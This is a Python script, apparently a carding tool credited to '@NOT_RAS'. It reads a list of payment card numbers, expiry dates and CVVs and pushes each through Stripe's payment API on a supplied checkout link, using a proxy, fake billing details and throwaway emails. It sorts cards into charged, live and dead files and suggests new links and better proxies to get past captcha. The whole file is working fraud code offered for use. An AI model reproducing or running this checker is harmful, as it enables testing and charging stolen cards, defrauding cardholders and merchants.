import time
import colorama
import requests
import random
import string
colorama.init()


CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'
RESET = '\033[0m'
BLUE = "\033[34m"
CYAN = "\033[36m"
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = "\033[m"
REVERSE = "\033[m"


banner = """
\033[1;35;40m

 ██▓███   ██▀███  ▓█████ ▓█████▄  ▄▄▄     ▄▄▄█████▓ ▒█████   ██▀███
▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▒████▄   ▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░██   █▌▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██▄▄▄▄██░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄
▒██▒ ░  ░░██▓ ▒██▒░▒████▒░▒████▓  ▓█   ▓██▒ ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒  ▒▒   ▓▒█░ ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
░▒ ░       ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒   ▒   ▒▒ ░   ░      ░ ▒ ▒░   ░▒ ░ ▒░
░░         ░░   ░    ░    ░ ░  ░   ░   ▒    ░      ░ ░ ░ ▒    ░░   ░
            ░        ░  ░   ░          ░  ░            ░ ░     ░
                          ░

\n\t    CODED BY - @NOT_RAS
\n\t SHARE AND SUPPORT BY - @CYBERASSEMBLE
\033[0;37;40m
"""
print(CLEAR_SCREEN)
print(banner)
#################################################################################################################


def multiexplode(string):
    lista = str(string)
    if lista.__contains__('|'):
        final = lista.split('|')
        return final
    elif lista.__contains__(':'):
        final = lista.split(':')
        return final


def chk(lista, proxy, cs, pk, amt):
    lista = lista.split('\n')[0]
    cc = multiexplode(lista)[0]
    mes = multiexplode(lista)[1]
    ano = multiexplode(lista)[2]
    cvv = multiexplode(lista)[3]
    ip = multiexplode(proxy)[0]
    port = multiexplode(proxy)[1]
    user = multiexplode(proxy)[2]
    pass1 = multiexplode(proxy)[3]
    mainpro = f'http://{user}:{pass1}@{ip}:{port}'
    proxy = {'http': mainpro, 'https': mainpro}
    email = (
        ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) +
        "%40nospam.today")
    try:
        url1 = "https://api.stripe.com/v1/payment_methods"
        data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&billing_details[name]=johnrose&billing_details[email]={email}&billing_details[address][country]=US&billing_details[address][line1]=newyork+st&billing_details[address][city]=newyork&billing_details[address][postal_code]=10080&billing_details[address][state]=NY&guid=NA&muid=NA&sid=NA&key={pk}&payment_user_agent=stripe.js%2F4d3h2v1sf%3B+stripe-js-v3%2F4d3h2v1sf%3B+payment-link%3B+checkout"
        req1 = requests.post(url1, data=data, proxies=proxy)
        response_dict = req1.json()
        if req1.text.__contains__('"id": "'):
            id = response_dict["id"]
            url2 = f'https://api.stripe.com/v1/payment_pages/{cs}/confirm'
            data2 = f"eid=NA&payment_method={id}&expected_amount={amt}&expected_payment_method_type=card&key={pk}"
            req2 = requests.post(url2, data=data2, proxies=proxy)
            response_dict2 = req2.json()
            response = req2.text
            if response.__contains__('succeeded'):
                print(
                    GREEN+f''' [CHARGED]  =>   {lista}   Message =>  Charged card  - @NOT_RAS''')
                with open("CHARGED.txt", 'a') as sav:
                    sav.write(
                        f''' [CHARGED]  =>   {lista}   Message =>  Charged card  - @NOT_RAS''')
                    sav.write('\n')
            elif response.__contains__("intent_confirmation_challenge"):
                print(
                    RED + f''' [DEAD] ❌ =>   {lista}   Message => Hcaptcha triggered (change stripe link and use HQ porxy)- @NOT_RAS''')
            elif response.__contains__("Your card's security code is incorrect"):
                print(
                    GREEN+f''' [LIVE CCN]  =>   {lista}   Message =>  Card security code is incorrect - @NOT_RAS''')
                with open("CCN.txt", 'a') as sav:
                    sav.write(
                        f''' [LIVE CCN]  =>   {lista}   Message =>  Card security code is incorrect - @NOT_RAS''')
                    sav.write('\n')
            elif response.__contains__("Your card has insufficient funds"):
                print(
                    GREEN+f''' [LIVE CC]  =>   {lista}   Message =>  Your card has insufficient funds - @NOT_RAS''')
                with open("INSUFF.txt", 'a') as sav:
                    sav.write(
                        f''' [LIVE CC]  =>   {lista}   Message =>  Your card has insufficient funds - @NOT_RAS''')
                    sav.write('\n')
            elif response.__contains__("Your card does not support this type of purchase"):
                print(
                    GREEN+f''' [LIVE CC]  =>   {lista}   Message =>  Your card does not support this type of purchase - @NOT_RAS''')
                with open("TRANSCATIONxNxA.txt", 'a') as sav:
                    sav.write(
                        f''' [LIVE CC]  =>   {lista}   Message =>  Your card does not support this type of purchase  - @NOT_RAS''')
                    sav.write('\n')
            else:
                mssg = response_dict2["error"]["message"]
                dec = response_dict2["error"]["decline_code"]
                print(
                    RED + f''' [DEAD] ❌ =>   {lista}   Message => {mssg}  decline_code => {dec}  - @NOT_RAS''')
        else:
            message = response_dict["error"]["message"]
            print(
                RED + f''' [DEAD] ❌ =>   {lista}   Message => {message} - @NOT_RAS''')

    except:
        print(RED+f'  Something Went Wrong..  ')


#################################################################################################################

if __name__ == "__main__":
    print(CYAN)
    ccfile = input(" Enter the file name of ccs : ")
    opi = input(" Enter your proxy [ip:port:username:password] : ")
    link = input(" Enter the Stripe checkout link : ")
    pk = input(" Enter the pk live of site : ")
    amt = input(" Enter the amount of checkout * 100 (Eg : If $1 then 100 ) : ")
    print('\n\n')
    string1 = link
    start_index = string1.find(
        "https://checkout.stripe.com/c/pay/") + len("https://checkout.stripe.com/c/pay/")
    end_index = string1.find("#")
    cs = string1[start_index:end_index]
    with open(ccfile, encoding='utf-8') as w:
        for x in w:
            chk(x, opi, cs, pk, amt)
            time.sleep(2)
